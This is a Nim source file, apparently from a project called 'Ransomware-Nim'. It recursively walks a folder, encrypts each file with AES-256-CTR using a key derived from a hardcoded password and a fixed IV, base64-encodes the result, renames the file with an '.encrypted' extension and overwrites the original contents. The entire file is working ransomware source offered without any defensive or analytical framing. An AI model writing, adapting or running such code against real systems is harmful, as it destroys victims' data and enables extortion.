import os
import strformat
import base64
import nimcrypto

func toByteSeq*(str: string): seq[byte] {.inline.} =
    # Converts a string to the corresponding byte sequence
    @(str.toOpenArrayByte(0, str.high))

let
    password: string = "myKey" # Our secret key
    path: string = "C:/Users/shant/Desktop/Ransomware-Nim/test"
                    #"C:" + "\" + "Users" + "\" + "shant" + "\" + "Desktop" + "\" + "Ransomware-Nim" +"\" + "test"

for file in walkDirRec path: # For any file/folder inside our folder
   let fileSplit = splitFile(file)
   if fileSplit.ext != ".encrypted": # Checking if the file is not encrypted yet
    echo fmt"[*] Encrypting: {file}"
    var
        inFileContents: string = readFile(file) # Getting the content of the file
        plaintext: seq[byte] = toByteSeq(inFileContents) # Formating the content to bytes
        ectx: CTR[aes256]
        key: array[aes256.sizeKey, byte]
        iv: array[aes256.sizeBlock, byte]
        encrypted: seq[byte] = newSeq[byte](len(plaintext))
    #iv - initial vector
    iv = [byte 183, 142, 238, 156, 42, 43, 248, 100, 125, 249, 192, 254, 217, 222, 133, 149]
    var expandedKey = sha256.digest(password)
    copyMem(addr key[0], addr expandedKey.data[0], len(expandedKey.data))
        
    #echo fmt"1-{expandedKey}"
    echo fmt"2-{key}"    
    
    ectx.init(key, iv)
    ectx.encrypt(plaintext, encrypted)
    ectx.clear()

    let encodedCrypted = encode(encrypted) # This var contains the encrypted data
    let finalFile = file & ".encrypted" # Giving a new extension
    moveFile(file, finalFile) # Changing the file extension
    writeFile(finalFile, encodedCrypted) # Writing the encrypted data to the file (Deletes everything  that was there before)

